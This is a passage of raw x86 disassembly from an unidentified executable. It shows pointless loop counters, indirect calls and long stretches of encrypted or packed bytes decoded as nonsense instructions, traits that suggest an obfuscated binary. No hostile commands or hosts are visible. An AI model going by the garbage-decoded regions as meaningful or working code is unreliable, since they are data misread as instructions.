  409bc2:	cmp    DWORD PTR ds:0x4336af,0x2
  409bc9:	jne    0x409bde
  409bcf:	push   DWORD PTR [ebp-0x28]
  409bd2:	push   DWORD PTR [ebp-0x18]
  409bd5:	push   DWORD PTR [ebp-0x10]
  409bd8:	call   DWORD PTR ds:0x412264
  409bde:	cmp    DWORD PTR ds:0x4336af,0x3
  409be5:	jne    0x409bf8
  409beb:	mov    edi,DWORD PTR ds:0x4336af
  409bf1:	dec    edi
  409bf2:	mov    DWORD PTR ds:0x4336af,edi
  409bf8:	mov    edi,DWORD PTR ds:0x4336af
  409bfe:	dec    edi
  409bff:	mov    DWORD PTR ds:0x4336af,edi
  409c05:	jmp    0x409bb5
  409c0a:	and    DWORD PTR ds:0x4336a3,0x0
  409c14:	jmp    0x409c26
  409c19:	mov    edi,DWORD PTR ds:0x4336a3
  409c1f:	inc    edi
  409c20:	mov    DWORD PTR ds:0x4336a3,edi
  409c26:	cmp    DWORD PTR ds:0x4336a3,0x13
  409c2d:	jae    0x409c5d
  409c33:	cmp    DWORD PTR ds:0x4336a3,0x17
  409c3a:	jne    0x409c58
  409c40:	push   0x43385d
  409c45:	push   0x433867
  409c4a:	push   DWORD PTR [ebp-0x1c]
  409c4d:	push   0x22b4
  409c52:	call   DWORD PTR ds:0x412268
  409c58:	jmp    0x409c19
  409c5d:	mov    DWORD PTR [ebp-0x2c],0xf89c853a
  409c64:	mov    DWORD PTR [ebp-0x30],0xf89c8539
  409c6b:	jmp    0x409fde
  409c70:	push   edx
  409c71:	jle    0x409c60
  409c73:	and    al,0x7d
  409c75:	jecxz  0x409cd4
  409c77:	push   0xffffffb4
  409c79:	inc    edx
  409c7a:	push   ds
  409c7b:	imul   edi,ecx,0x65117b18
  409c81:	out    dx,al
  409c82:	jl     0x409d00
  409c84:	retf   0x7c79
  409c87:	jl     0x409c24
  409c89:	jo     0x409cc8
  409c8b:	cdq    
  409c8c:	adc    al,0xcf
  409c8e:	adc    al,0x85
  409c90:	push   0x638e34f3
  409c95:	cmp    BYTE PTR [eax+0x6b5c5c94],al
  409c9b:	addr16 mov al,ds:0xa4d2
  409c9f:	xor    DWORD PTR [ecx-0x14793ac5],eax
  409ca5:	pop    ecx
  409ca6:	ror    ch,1
  409ca8:	bound  esp,QWORD PTR [edx-0x3550ddd1]
  409cae:	mov    edi,0x4b3fb6b6
  409cb3:	ss out dx,eax
  409cb5:	pop    ss
  409cb6:	test   BYTE PTR [esi-0x7e],ah
  409cb9:	push   0xfffffffe
  409cbb:	xchg   esi,eax
  409cbc:	shr    DWORD PTR [ecx-0x3d],0x9d
  409cc0:	mov    ds,WORD PTR [edx-0x2016b0bc]
  409cc6:	jl     0x409cd9
  409cc8:	outs   dx,BYTE PTR ds:[esi]
  409cc9:	inc    ebp
  409cca:	mov    cl,0x1d
  409ccc:	push   ebp
  409ccd:	rcr    BYTE PTR [edi-0x7e0dae4b],1
  409cd3:	fnsave [ecx+0x22]
  409cd6:	push   ecx
  409cd7:	pop    es
  409cd8:	ficomp WORD PTR [eax+esi*8]
  409cdb:	add    al,0xd8
  409cdd:	es inc ebx
  409cdf:	dec    esi
  409ce0:	enter  0xd9e6,0xb6
  409ce4:	retf   
  409ce5:	mov    dh,0x98
  409ce7:	ror    BYTE PTR [ebx-0x70],1
  409cea:	leave  
  409ceb:	rcr    BYTE PTR [si-0x3c],cl
  409cef:	jno    0x409d44
  409cf1:	dec    esp
  409cf2:	addr16 jb 0x409c7b
  409cf5:	dec    edx
  409cf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cf7:	or     al,cl
  409cf9:	inc    edx
  409cfa:	(bad)
  409cfd:	mov    esp,0x2bf5ae80
  409d02:	shl    BYTE PTR [esp+eax*8],1
  409d05:	push   0x7b
  409d07:	xchg   esi,eax
  409d08:	mov    ds:0x3cc1af27,eax
  409d0d:	jae    0x409d59
  409d0f:	stos   BYTE PTR es:[edi],al
  409d10:	dec    edi
  409d11:	in     al,0x21
  409d13:	jg     0x409d29
  409d15:	int3   
  409d16:	in     eax,dx
  409d17:	xchg   esp,eax
  409d18:	bound  edi,QWORD PTR [eax+0xf]
  409d1b:	out    0x75,eax
  409d1d:	sub    al,0xd8
  409d1f:	jb     0x409d58
  409d21:	and    BYTE PTR ds:0x7bfd3df7,cl
  409d27:	jp     0x409da4
  409d29:	sbb    al,0x92
  409d2b:	cdq    
  409d2c:	pcmpeqb mm4,QWORD PTR ds:0x58f649dd
  409d33:	mov    BYTE PTR [esi+0x66342fe4],al
  409d39:	jo     0x409d92
  409d3b:	jg     0x409d8c
  409d3d:	mov    al,ds:0x60d2076f
  409d42:	mov    dh,0x14
  409d44:	and    DWORD PTR [esp+ecx*2],0xfffffff8
  409d48:	and    eax,0x7a403dc0
  409d4d:	sbb    ch,dl
  409d4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d50:	daa    
  409d51:	fisttp WORD PTR [ebx+0x2b]
  409d54:	jecxz  0x409dcd
  409d56:	ins    DWORD PTR es:[edi],dx
  409d57:	cld    
  409d58:	fwait
  409d59:	sbb    al,bh
  409d5b:	lods   al,BYTE PTR ds:[esi]
  409d5c:	sahf   
  409d5d:	jae    0x409cf5
  409d5f:	(bad)  
  409d60:	(bad)  
  409d61:	fstp   DWORD PTR [edx]
  409d63:	(bad)  
  409d64:	(bad)  
  409d66:	sub    esi,eax
  409d68:	scas   al,BYTE PTR es:[edi]
  409d69:	push   edi
  409d6a:	mov    edx,esi
  409d6c:	aam    0x6a
  409d6e:	or     ecx,DWORD PTR [ecx]
  409d70:	mov    al,0xac
  409d72:	out    0xea,al
  409d74:	in     al,0x93
  409d76:	test   BYTE PTR [esi+0x53],0x5f
  409d7a:	fs loope 0x409d87
  409d7d:	call   0xef916bcb
  409d82:	cmp    BYTE PTR [esi-0x4b],dh
  409d85:	outs   dx,DWORD PTR ds:[esi]
  409d86:	jae    0x409d4e
  409d88:	ss int 0x50
  409d8b:	pop    ecx
  409d8c:	mov    ebx,esi
  409d8e:	xor    ch,BYTE PTR [ebx]
  409d90:	push   eax
  409d91:	int3   
  409d92:	adc    bl,cl
  409d94:	ss popa 
  409d96:	mov    ebx,DWORD PTR [ebx+0x7f8984a9]
  409d9c:	dec    esi
  409d9d:	je     0x409d29
  409d9f:	sub    DWORD PTR [edi-0x52],ecx
  409da2:	cmp    ch,BYTE PTR [ecx]
  409da4:	lods   al,BYTE PTR ds:[esi]
  409da5:	div    DWORD PTR [esi]
  409da7:	test   DWORD PTR [ecx-0x59],esp
  409daa:	inc    esi
  409dab:	sbb    dh,BYTE PTR [ecx-0x5f]
  409dae:	inc    ebx
  409daf:	test   eax,esp
  409db1:	daa    
  409db2:	xchg   ah,cl
  409db4:	pop    ebp
  409db5:	idiv   DWORD PTR [eax+eiz*2-0x3e]
  409db9:	jecxz  0x409dd5
  409dbb:	xchg   esi,eax
  409dbc:	dec    ecx
  409dbd:	xchg   BYTE PTR [ecx-0x3e],bl
  409dc0:	cmp    edi,DWORD PTR [ecx+edx*1+0x6dfe627a]
  409dc7:	xchg   BYTE PTR [edx-0x13],bl
  409dca:	je     0x409db1
  409dcc:	xchg   DWORD PTR ds:0x35490d55,ebx
  409dd2:	icebp  
  409dd3:	or     al,0xa9
  409dd5:	mov    bl,0xeb
  409dd7:	lahf   
  409dd8:	js     0x409d84
  409dda:	jg     0x409df7
  409ddc:	inc    ecx
  409ddd:	je     0x409d84
  409ddf:	adc    al,0xef
  409de1:	dec    eax
  409de2:	dec    ecx
  409de3:	xchg   DWORD PTR [esi-0x28b3cefc],esi
  409de9:	adc    ch,0x69
  409dec:	fwait
  409ded:	add    DWORD PTR [ecx+0x26c76327],0xf230ee34
  409df7:	cmp    ah,BYTE PTR [ecx+0xe5cedae]
  409dfd:	push   eax
  409dfe:	jge    0x409e02
  409e00:	mov    eax,ds:0x4e495534
  409e05:	mov    ch,0x6e
  409e07:	repnz in eax,0xf3
  409e0a:	mov    bh,0x14
  409e0c:	je     0x409df0
  409e0e:	mov    eax,ds:0x49babdca
  409e13:	retf   
  409e14:	ret    0x2d09
  409e17:	ret    0xf2d0
  409e1a:	repnz push ss
  409e1c:	mov    edi,0x6207fba4
  409e21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e22:	mov    WORD PTR ds:[edx],cs
  409e25:	fcmovbe st,st(1)
  409e27:	ins    BYTE PTR es:[edi],dx
  409e28:	test   al,0xc9
  409e2a:	icebp  
  409e2b:	mov    edx,0xedbdcdb4
  409e30:	mov    esi,esi
  409e32:	bound  eax,QWORD PTR [ebx+0x79]
  409e35:	fwait
  409e36:	popa   
  409e37:	push   ds
  409e38:	cmc    
  409e39:	dec    esp
  409e3a:	sbb    ebp,edx
  409e3c:	rcr    BYTE PTR [ebp-0x80],1
  409e3f:	call   0x26e7d368
  409e44:	or     al,0xc5
  409e46:	jmp    0x409ded
  409e48:	pop    eax
  409e49:	adc    ch,cl
  409e4b:	mov    esp,0x13767d88
  409e50:	adc    BYTE PTR [eax-0x5f2e029e],bl
  409e56:	dec    edi
  409e57:	xchg   ecx,eax
  409e58:	mov    ebx,0xeae817f9
  409e5d:	xor    ebx,DWORD PTR [edi+ebx*8]
  409e60:	xchg   edx,eax
  409e61:	mov    bl,0xfe
  409e63:	int    0xe5
  409e65:	clc    
  409e66:	cs and eax,0xa2fde66f
  409e6c:	push   ebx
  409e6d:	jl     0x409eba
  409e6f:	sub    esi,0xffffff8b
  409e72:	inc    esp
  409e73:	pusha  
  409e74:	mov    es,ebp
  409e76:	mov    ds:0x2e8e26d9,eax
  409e7b:	lahf   
  409e7c:	jge    0x409e42
  409e7e:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  409e80:	aas    
  409e81:	mov    ah,0xfa
  409e83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e84:	aaa    
  409e85:	xchg   BYTE PTR [edi+0x310b16b1],ch
  409e8b:	loope  0x409e1e
  409e8d:	lods   al,BYTE PTR ds:[esi]
  409e8e:	std    
  409e8f:	mov    ecx,0xacb5bc8b
  409e94:	mov    ebp,0x399f318e
  409e99:	pop    ds
  409e9a:	dec    ebx
  409e9b:	ins    BYTE PTR es:[edi],dx
  409e9c:	xor    BYTE PTR [edi-0x7472f89c],cl
  409ea2:	mov    al,0xdc
  409ea4:	ins    DWORD PTR es:[edi],dx
  409ea5:	push   ecx
  409ea6:	jno    0x409e70
  409ea8:	mov    ebx,0x119d484f
  409ead:	call   0xa2eb:0x18cc4e0f
  409eb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409eb5:	jnp    0x409f06
  409eb7:	cmc    
  409eb8:	arpl   si,cx
  409eba:	test   BYTE PTR [esi-0x8],dl
  409ebd:	test   edi,edi
  409ebf:	cmp    BYTE PTR [ecx],dl
  409ec1:	(bad)  
  409ec2:	arpl   ax,sp
  409ec4:	dec    ecx
  409ec5:	imul   ebx,DWORD PTR [edi-0x3b],0xfffffff3
  409ec9:	sub    BYTE PTR [esi+0x56],bl
  409ecc:	rcr    BYTE PTR [edx],1
  409ece:	push   ds
  409ecf:	inc    DWORD PTR [edi+ecx*1-0x65]
  409ed3:	ins    DWORD PTR es:[edi],dx
  409ed4:	inc    eax
  409ed5:	aad    0x0
  409ed7:	enter  0xb529,0xe7
  409edb:	enter  0x6a06,0x8d
  409edf:	repz out 0xc5,eax
  409ee2:	pop    ebp
  409ee3:	stos   DWORD PTR es:[edi],eax
  409ee4:	(bad)  
  409ee5:	out    0xc5,al
  409ee7:	mov    ebp,0x64a1116f
  409eec:	add    edi,DWORD PTR [edx+0x24386775]
  409ef2:	mov    cl,0x56
  409ef4:	push   ecx
  409ef5:	mov    ah,BYTE PTR gs:[ebx]
  409ef8:	int    0x34
  409efa:	(bad)  
  409efb:	mov    edi,0xf13a7488
  409f00:	aad    0x82
  409f02:	push   ebx
  409f03:	data16 (bad) 
  409f05:	sub    DWORD PTR [eax+0x682aa19a],edi
  409f0b:	add    esi,DWORD PTR [ebp+0x5c]
  409f0e:	adc    dl,dl
  409f10:	test   cx,dx
  409f13:	std    
  409f14:	(bad)  
  409f15:	mov    dl,0xee
  409f17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f18:	cwde   
  409f19:	adc    al,0x9c
  409f1b:	lods   eax,DWORD PTR ds:[esi]
  409f1c:	push   edx
  409f1d:	xchg   esp,eax
  409f1e:	ficomp WORD PTR [esi-0x76a364f2]
  409f24:	push   edx
  409f25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f26:	xchg   esi,eax
  409f27:	mov    fs:0x5366d1a5,eax
  409f2d:	push   esp
  409f2e:	jle    0x409f39
  409f30:	and    edi,DWORD PTR [edx]
  409f32:	xchg   esp,eax
  409f33:	mov    WORD PTR [edi],?
  409f35:	push   es
  409f36:	dec    esi
  409f37:	adc    eax,0xe808d656
  409f3c:	test   al,0x33
  409f3e:	ss int3 
  409f40:	or     BYTE PTR [ecx+0x33ad7ae6],ch
  409f46:	dec    esp
  409f47:	mov    edx,DWORD PTR [eax]
  409f49:	xchg   ebx,eax
  409f4a:	arpl   WORD PTR ds:0x321efe80,sp
  409f50:	dec    ebx
  409f51:	aad    0x7c
  409f53:	cmp    al,0x92
  409f55:	aaa    
  409f56:	dec    ebx
  409f57:	pushf  
  409f58:	mov    eax,0x8f5af35c
  409f5d:	xchg   ebx,eax
  409f5e:	repnz xor BYTE PTR [ecx+0x9719a64],bl
  409f65:	pop    edi
  409f66:	cs retf 
  409f68:	xor    eax,esi
  409f6a:	(bad)  
  409f6b:	mov    ecx,0x93e337ca
  409f70:	push   eax
  409f71:	add    al,0x4b
  409f73:	repz sub BYTE PTR [ebx-0x371c12d3],bh
  409f7a:	ds stc 
  409f7c:	(bad)  
  409f7d:	nop
  409f7e:	outs   dx,DWORD PTR ds:[esi]
  409f7f:	fisttp WORD PTR [ebp+0x79]
  409f82:	or     BYTE PTR [edx+esi*1+0x131980ba],ch
  409f89:	jg     0x409f50
  409f8b:	and    eax,0xe24941e4
  409f90:	jbe    0x409f50
  409f92:	mov    ebp,0xf8088ced
  409f97:	mov    dl,BYTE PTR [edx]
  409f99:	ja     0x409f72
  409f9b:	nop
  409f9c:	or     BYTE PTR [edi],cl
  409f9e:	push   eax
  409f9f:	jne    0x409f93
  409fa1:	loope  0x409fd2
  409fa3:	pop    ebx
  409fa4:	mov    esp,0x83d51d67
  409fa9:	nop
  409faa:	jb     0x409fa2
  409fac:	xor    dh,BYTE PTR [esi]
  409fae:	inc    edx
  409faf:	mov    al,0xaf
  409fb1:	mov    ebx,0x4ef806f
  409fb6:	retf   
  409fb7:	stos   BYTE PTR es:[edi],al
  409fb8:	stos   DWORD PTR es:[edi],eax
  409fb9:	lods   al,BYTE PTR ds:[esi]
  409fba:	pop    esi
  409fbb:	fs dec ebx
  409fbd:	mov    ah,BYTE PTR fs:[ecx-0x31149348]
  409fc4:	repz push ebx
  409fc6:	ret    
  409fc7:	add    ah,BYTE PTR [edx]
  409fc9:	sub    al,0xff
  409fcb:	mov    edx,ebx
  409fcd:	mov    WORD PTR [esi+0x1e],ss
  409fd0:	jmp    0xcb24:0x1eeccfc8
  409fd7:	or     al,0x4f
  409fd9:	cmc    
  409fda:	mov    ebx,0xc74b9437
  409fdf:	inc    ebp
  409fe0:	int3   
  409fe1:	cmp    BYTE PTR [ebp+0x2581f89c],al
  409fe7:	and    esi,DWORD PTR [edi]
  409fe9:	inc    ebx
  409fea:	add    BYTE PTR [eax],al
  409fec:	add    BYTE PTR [eax],al
  409fee:	add    cl,ch
  409ff0:	or     eax,0x8b000000
  409ff5:	adc    eax,0x433723
  409ffa:	inc    edx
  409ffb:	mov    DWORD PTR ds:0x433723,edx
  40a001:	cmp    DWORD PTR ds:0x433723,0x16
  40a008:	jae    0x40a02b
  40a00e:	cmp    DWORD PTR ds:0x433723,0x18
  40a015:	jne    0x40a026
  40a01b:	push   0x35b9
  40a020:	call   DWORD PTR ds:0x41226c
  40a026:	jmp    0x409ff4
  40a02b:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a032:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a039:	movzx  edx,BYTE PTR ds:0x433773
  40a040:	adc    edx,DWORD PTR ds:0x43372b
  40a046:	mov    DWORD PTR ds:0x433773,edx
  40a04c:	mov    edx,DWORD PTR [ebp+0x8]
  40a04f:	xor    edx,eax
  40a051:	mov    edi,DWORD PTR [ebp-0x10]
  40a054:	add    edx,ecx
  40a056:	cmp    edi,edx
  40a058:	je     0x40d768
  40a05e:	mov    DWORD PTR ds:0x433657,0x2fff
  40a068:	push   ebx
  40a069:	jmp    0x40d743
  40a06e:	movzx  edi,BYTE PTR ds:0x4336df
  40a075:	xor    DWORD PTR ds:0x4336b3,edi
  40a07b:	mov    edx,DWORD PTR [ebp-0x8]
  40a07e:	mov    edi,DWORD PTR [ebp-0x10]
  40a081:	sub    DWORD PTR ds:0x433653,0x7416
  40a08b:	sub    edi,edx
  40a08d:	movzx  edx,WORD PTR ds:0x43376b
  40a094:	xor    DWORD PTR ds:0x43375b,edx
  40a09a:	jmp    0x40a40d
  40a09f:	push   edi
  40a0a0:	mov    dh,0x10
  40a0a2:	sti    
  40a0a3:	std    
  40a0a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0a5:	push   edi
  40a0a6:	jb     0x40a085
  40a0a8:	xor    dl,BYTE PTR [ecx+0x4e]
  40a0ab:	jg     0x40a04f
  40a0ad:	es addr16 xor ebp,edx
  40a0b1:	jl     0x40a12f
  40a0b3:	retf   0x7c79
  40a0b6:	jl     0x40a04f
  40a0b8:	pop    ebx
  40a0b9:	sbb    bh,BYTE PTR [edi]
  40a0bb:	faddp  st(0),st
  40a0bd:	dec    edx
  40a0be:	popa   
  40a0bf:	fcos   
  40a0c1:	dec    esp
  40a0c2:	cmp    eax,0x57fdb1b8
  40a0c7:	lds    ebp,FWORD PTR [edi+0x41429f03]
  40a0cd:	test   DWORD PTR [esi-0x2fd68b8a],eax
  40a0d3:	adc    DWORD PTR [esi],0xf73cca41
  40a0d9:	jge    0x40a0e2
  40a0db:	xor    dl,BYTE PTR [ebp-0x2594d6ee]
  40a0e1:	mov    ds:0x3ad959dc,al
  40a0e6:	xor    eax,0x148d75a4
  40a0eb:	cdq    
  40a0ec:	test   DWORD PTR [ebx-0x22232a1d],ecx
  40a0f2:	ja     0x40a0c0
  40a0f4:	mov    WORD PTR [edi+0x70],ds
  40a0f7:	retf   0x7251
  40a0fa:	pop    esp
  40a0fb:	rcl    BYTE PTR [esp+eax*2+0x60],1
  40a0ff:	adc    BYTE PTR [edx+0x8ef7ee9],dl
  40a105:	xor    al,0xd3
  40a107:	gs rcr edx,0xbb
  40a10b:	int    0x8d
  40a10d:	icebp  
  40a10e:	stos   BYTE PTR es:[edi],al
  40a10f:	add    al,0xfd
  40a111:	jg     0x40a0c9
  40a113:	xor    eax,0x4aab33b6
  40a118:	test   bh,0x7c
  40a11b:	pop    ebp
  40a11c:	jl     0x40a106
  40a11e:	loope  0x40a189
  40a120:	mov    ch,0xc0
  40a122:	lea    eax,[ebp+0x50c826f2]
  40a128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a129:	mov    ds:0xf3788647,eax
  40a12e:	(bad)  
  40a12f:	arpl   WORD PTR [edi+edi*1-0x36],sp
  40a133:	add    DWORD PTR [ebx],ecx
  40a135:	lock xrelease adc BYTE PTR [eax-0x77],0x87
  40a13b:	xchg   edx,eax
  40a13c:	add    esp,DWORD PTR [esi]
  40a13e:	ins    DWORD PTR es:[edi],dx
  40a13f:	cld    
  40a140:	xor    DWORD PTR [eax-0x31],0xffffff9d
  40a144:	pop    edx
  40a145:	adc    al,0xa2
  40a147:	rcl    DWORD PTR [eax+0x11],0x2e
  40a14b:	cwde   
  40a14c:	push   cs
  40a14d:	hlt    
  40a14e:	sbb    edi,edx
  40a150:	xchg   ecx,eax
  40a151:	cmp    eax,0xf97e1605
  40a156:	fild   WORD PTR [edi+eiz*8]
  40a159:	sahf   
  40a15a:	in     al,dx
  40a15b:	sti    
  40a15c:	or     BYTE PTR [ecx-0x72],bl
  40a15f:	jl     0x40a1a5
  40a161:	dec    eax
  40a162:	sbb    DWORD PTR [ebx+0x52449587],eax
  40a168:	cmp    eax,0x4f333a1
  40a16d:	mov    eax,0xa5bdb95c
  40a172:	ins    BYTE PTR es:[edi],dx
  40a173:	ja     0x40a1a8
  40a175:	stos   BYTE PTR es:[edi],al
  40a176:	push   eax
  40a177:	adc    BYTE PTR [edx+ecx*8+0x7841fff9],al
  40a17e:	mov    BYTE PTR [eax+0x4f61e84b],bl
  40a184:	pop    ebx
  40a185:	aas    
  40a186:	jmp    FWORD PTR [ebp-0x5b]
  40a189:	push   es
  40a18a:	add    edi,DWORD PTR [esi+0x69209343]
  40a190:	xchg   esp,eax
  40a191:	sub    al,0x64
  40a193:	xor    BYTE PTR [ecx-0x7d023fe8],dh
  40a199:	mov    eax,ds:0xe1ebde87
  40a19e:	nop
  40a19f:	inc    esi
  40a1a0:	aas    
  40a1a1:	ret    
  40a1a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1a3:	xchg   edi,eax
  40a1a4:	pop    ebx
  40a1a5:	add    ebx,0x8f3aa2fb
  40a1ab:	cmp    DWORD PTR [eax+0x5b],ebp
  40a1ae:	(bad)  
  40a1af:	xor    al,0xed
  40a1b1:	int3   
  40a1b2:	scas   al,BYTE PTR es:[edi]
  40a1b3:	push   ecx
  40a1b4:	pop    ebx
  40a1b5:	(bad)  
  40a1b7:	shr    DWORD PTR [ecx+0x1a06bb40],1
  40a1bd:	fimul  WORD PTR [ebx+0x1c29f836]
  40a1c3:	push   edi
  40a1c4:	push   ss
  40a1c5:	adc    eax,0x4c376b91
  40a1ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1cb:	ins    DWORD PTR es:[edi],dx
  40a1cc:	imul   ebp,eax,0xcdfb8d8f
  40a1d2:	mov    edi,eax
  40a1d4:	inc    ebx
  40a1d5:	ror    esi,0xbf
  40a1d8:	sbb    BYTE PTR [edi+0x421053a6],ah
  40a1de:	jb     0x40a1f7
  40a1e0:	inc    ebp
  40a1e1:	mov    ds:0x8d8175de,eax
  40a1e6:	mov    eax,0x8c614bed
  40a1ec:	in     eax,0xbf
  40a1ee:	sub    cl,BYTE PTR [ecx+0x2415b3b3]
  40a1f4:	mov    DWORD PTR [eax+0x6f],edi
  40a1f7:	sbb    edi,DWORD PTR [ecx+0x73]
  40a1fa:	les    edi,FWORD PTR [ebx]
  40a1fc:	arpl   WORD PTR [ecx+eax*1-0x1309bbcc],si
  40a203:	stc    
  40a204:	lahf   
  40a205:	test   al,0xda
  40a207:	imul   ebp,DWORD PTR [ebp+eax*2+0x32],0xf61801ec
  40a20f:	out    dx,eax
  40a210:	out    0xcd,al
  40a212:	mov    eax,0x86315873
  40a217:	dec    edx
  40a218:	arpl   WORD PTR [ebx],cx
  40a21a:	fwait
  40a21b:	rol    BYTE PTR [eax+0x2fdb9f46],0x81
  40a222:	or     edx,esi
  40a224:	jg     0x40a2a1
  40a226:	call   0x26a80829
  40a22b:	add    DWORD PTR [ebx-0x6f],edx
  40a22e:	dec    ebp
  40a22f:	in     al,dx
  40a230:	aad    0xac
  40a232:	and    eax,0x823a8bcf
  40a237:	es xchg ebp,eax
  40a239:	(bad)  
  40a23a:	xchg   esi,eax
  40a23b:	add    eax,0x56a17ad2
  40a240:	dec    edx
  40a241:	mov    cl,0xf1
  40a243:	in     al,0x56
  40a245:	dec    ebx
  40a246:	lahf   
  40a247:	fldcw  WORD PTR [esi-0x406409cf]
  40a24d:	xor    eax,ebx
  40a24f:	test   al,0xe9
  40a251:	sbb    BYTE PTR [edx],cl
  40a253:	inc    BYTE PTR [ecx+0x13]
  40a256:	lea    edi,[ebx]
  40a258:	mov    ds:0x7a05065d,eax
  40a25d:	mov    al,0xf8
  40a25f:	call   0xccbf3eb1
  40a264:	je     0x40a25c
  40a266:	test   DWORD PTR ds:0x10398459,0xf53f936a
  40a271:	mov    eax,0xa2d1c666
  40a276:	es fucomi st,st(6)
  40a279:	mov    ah,0x58
  40a27b:	fbstp  TBYTE PTR [ebp+0x3b]
  40a27e:	mov    ds:0x4a0c0416,al
  40a283:	sbb    edi,DWORD PTR [esp+esi*4+0x6d670a02]
  40a28a:	pop    esp
  40a28b:	sbb    DWORD PTR [ebx+0x4a],eax
  40a28e:	out    dx,eax
  40a28f:	and    eax,0x22eb63ec
  40a294:	jnp    0x40a237
  40a296:	sbb    esi,DWORD PTR [edi-0x11]
  40a299:	cdq    
  40a29a:	jo     0x40a258
  40a29c:	inc    esp
  40a29d:	inc    ebx
  40a29e:	cmp    ah,ch
  40a2a0:	adc    BYTE PTR [edx-0x12],al
  40a2a3:	mov    ah,0x4b
  40a2a5:	pop    ebx
  40a2a6:	stc    
  40a2a7:	shl    BYTE PTR [ebx],cl
  40a2a9:	and    al,0x5e
  40a2ab:	or     DWORD PTR [ecx],ecx
  40a2ad:	jg     0x40a258
  40a2af:	push   edi
  40a2b0:	add    DWORD PTR es:[eax-0x129b9161],ecx
  40a2b7:	std    
  40a2b8:	mov    edi,0x7cb3c4bd
  40a2bd:	ja     0x40a28c
  40a2bf:	mov    ds:0x51b30590,al
  40a2c4:	ds call 0xc8327197
  40a2ca:	cwde   
  40a2cb:	int3   
  40a2cc:	aas    
  40a2cd:	bnd jbe 0x40a2e3
  40a2d0:	mov    esp,0x8c740fa
  40a2d5:	or     ch,ch
  40a2d7:	popf   
  40a2d8:	xor    al,0x35
  40a2da:	loopne 0x40a289
  40a2dc:	aaa    
  40a2dd:	adc    al,0x5b
  40a2df:	lahf   
  40a2e0:	xchg   BYTE PTR [edi-0x21],dl
  40a2e3:	retf   0x6a6d
  40a2e6:	xchg   DWORD PTR [esi],edx
  40a2e8:	jmp    0x593b:0xff7fd502
  40a2ef:	cmpxchg BYTE PTR [ebp+0x39cff4fe],dh
  40a2f6:	in     eax,dx
  40a2f7:	push   eax
  40a2f8:	jmp    0x1afcca06
  40a2fd:	cli    
  40a2fe:	xor    DWORD PTR [eax],eax
  40a300:	mov    cs,WORD PTR [esi+0x59160eb]
  40a306:	popa   
  40a307:	inc    edx
  40a308:	mov    eax,ds:0xf1ba6224
  40a30d:	(bad)  
  40a30f:	mov    dh,0x92
  40a311:	std    
  40a312:	loope  0x40a391
  40a314:	ror    DWORD PTR [edi-0x3ee7f208],cl
  40a31a:	ins    DWORD PTR es:[edi],dx
  40a31b:	jae    0x40a2d6
  40a31d:	fwait
  40a31e:	cmc    
  40a31f:	nop
  40a320:	cwde   
  40a321:	jbe    0x40a31b
  40a323:	fnstcw WORD PTR [ebp-0x207b76c2]
  40a329:	call   0xf783:0x30f06d16
  40a330:	push   0xfdbde25d
  40a335:	cld    
  40a336:	xor    edx,DWORD PTR [bp+di]
  40a339:	xor    ebx,DWORD PTR [eax-0x7019411c]
  40a33f:	mov    bh,0xc9
  40a341:	mov    ebp,0x29b4710b
  40a346:	xchg   ebp,eax
  40a347:	lahf   
  40a348:	adc    eax,0x7f5cef9
  40a34d:	out    0xe9,eax
  40a34f:	dec    edi
  40a350:	push   ds
  40a351:	mov    esp,0x848a1e4e
  40a356:	pushf  
  40a357:	mov    dh,0x32
  40a359:	test   al,0x47
  40a35b:	ret    0x7e64
  40a35e:	nop
  40a35f:	loopne 0x40a3ad
  40a361:	inc    ecx
  40a362:	rcr    BYTE PTR [edx-0x6e],0xad
  40a366:	arpl   WORD PTR [edx-0x41db43e0],bx
  40a36c:	aad    0x96
  40a36e:	xchg   esp,eax
  40a36f:	sahf   
  40a370:	mov    ebp,0x33d7545f
  40a375:	add    al,0xd5
  40a377:	jge    0x40a393
  40a379:	rcr    BYTE PTR ds:[esi-0x73],0xbd
  40a37e:	mov    esi,0x3b1a8d9
  40a383:	jns    0x40a356
  40a385:	aad    0x94
  40a387:	pop    es
  40a388:	loope  0x40a3db
  40a38a:	dec    ebp
  40a38b:	pop    edx
  40a38c:	adc    DWORD PTR [edx-0x22e5beb4],ecx
  40a392:	popa   
  40a393:	mov    esp,DWORD PTR [ebx]
  40a395:	loop   0x40a3d5
  40a397:	sbb    ah,0xe6
  40a39a:	mov    WORD PTR [ecx-0x2ec9446],fs
  40a3a0:	and    eax,0xd84035f0
  40a3a5:	ins    DWORD PTR es:[edi],dx
  40a3a6:	cs dec esp
  40a3a8:	aas    
  40a3a9:	mov    WORD PTR [edx-0x519bddf0],cs
  40a3af:	jg     0x40a350
  40a3b1:	and    esp,ebx
  40a3b3:	out    dx,al
  40a3b4:	loop   0x40a3d9
  40a3b6:	aad    0x4f
  40a3b8:	push   DWORD PTR [ecx-0x147ce28b]
  40a3be:	pop    eax
  40a3bf:	xor    al,BYTE PTR [ecx+0x73162d3c]
  40a3c5:	pop    esi
  40a3c6:	ror    edx,0x49
  40a3c9:	or     dl,bh
  40a3cb:	add    DWORD PTR [edi],edx
  40a3cd:	inc    esp
  40a3ce:	dec    ebx
  40a3cf:	out    dx,al
  40a3d0:	(bad)  
  40a3d1:	js     0x40a43f
  40a3d3:	dec    ebx
  40a3d4:	adc    DWORD PTR [ecx+0x78ab28ba],esp
  40a3da:	jmp    0x40a3f9
  40a3dc:	fiadd  DWORD PTR [edx]
  40a3de:	nop
  40a3df:	jae    0x40a45a
  40a3e1:	jecxz  0x40a430
  40a3e3:	mov    ds:0x65ed8bea,eax
  40a3e8:	lahf   
  40a3e9:	and    edi,DWORD PTR [ecx]
  40a3eb:	repnz xor eax,0x19e5a596
  40a3f1:	mov    BYTE PTR [eax],cl
